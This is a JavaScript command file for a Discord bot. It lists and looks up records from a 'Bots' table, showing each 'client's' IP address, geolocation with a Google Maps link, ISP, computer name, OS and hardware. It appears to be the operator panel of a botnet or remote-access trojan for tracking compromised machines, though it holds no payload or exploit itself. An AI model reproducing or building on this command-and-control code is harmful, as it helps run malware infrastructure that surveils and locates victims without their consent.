const Discord = require("discord.js");
const paginationEmbed = require("discord.js-pagination");
const db = require("../models");
const Op = db.Sequelize.Op;

exports.run = (client, message, args) => {
    if (args.length == 0) {
        db.Bots.findAll().then((results) => {
            const clientsPerPage = 3;
            let pages = [];
            let fields = [];

            for (const [index, element] of results.reverse().entries()) {
                fields.push({
                    name: !element.tag ? "No tag" : element.tag,
                    value: `
                        **ID**: ${element.id}
                        **IP Address**: ${element.ipAddress}
                        **Country**: ${element.country}
                        **OS**: ${element.operatingSystem}
                    `,
                    inline: true,
                });

                if (
                    index % clientsPerPage == 2 ||
                    index == results.length - 1
                ) {
                    const embed = new Discord.MessageEmbed()
                        .setColor("#0099ff")
                        .addFields(fields)
                        .setTimestamp();

                    pages.push(embed);
                    fields = [];
                }
            }

            paginationEmbed(message, pages);
        });
    } else {
        db.Bots.findAll({
            where: {
                [Op.or]: [
                    {
                        id: args[0],
                    },
                    {
                        tag: args[0],
                    },
                ],
            },
        }).then((results) => {
            if (results.length > 0) {
                const element = results[0];
                const embed = new Discord.MessageEmbed()
                    .setColor("#0099ff")
                    .addFields({
                        name: element.ipAddress,
                        value: `
                            **ID**: ${element.id}
                            **Tag**: ${
                                !element.tag ? "No tag found" : element.tag
                            }
                            **IP Address**: ${element.ipAddress}
                            **Country**: ${element.country}
                            **Region**: ${element.region}
                            **City**: ${element.city}
                            **Location**: https://www.google.com/maps/search/?api=1&query=${
                                element.lat
                            },${element.lon}
                            **ISP**: ${element.isp}
                            **OS**: ${element.operatingSystem}
                            **Release**: ${element.release}
                            **Version**: ${element.version}
                            **Computer Name**: ${element.nodeName}
                            **Processor**: ${element.processor}
                            **Architecture**: ${element.architecture}
                            **Boot Time**: ${element.bootTime}
                            **Cores**: ${element.cpuCores}
                            **Memory**: ${element.memory}`,
                    })
                    .setThumbnail(
                        `https://www.countryflags.io/${element.countryCode}/flat/64.png`
                    )
                    .setTimestamp();

                message.channel.send(embed);
            } else {
                message.channel.send("Client not found");
            }
        });
    }
};
